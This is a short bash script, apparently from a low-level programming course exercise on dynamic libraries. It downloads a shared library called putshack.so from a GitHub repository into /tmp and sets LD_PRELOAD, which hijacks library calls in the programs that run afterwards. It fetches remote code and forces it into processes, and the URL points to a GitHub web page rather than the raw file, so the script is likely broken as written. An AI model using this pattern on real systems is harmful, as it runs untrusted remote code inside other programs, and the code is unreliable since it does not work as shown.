#!/bin/bash
wget -O /tmp/putshack.so https://github.com/uwenorjeff/alx-low_level_programming/blob/main/0x18-dynamic_libraries/putshack.so
export LD_PRELOAD=/tmp/putshack.so
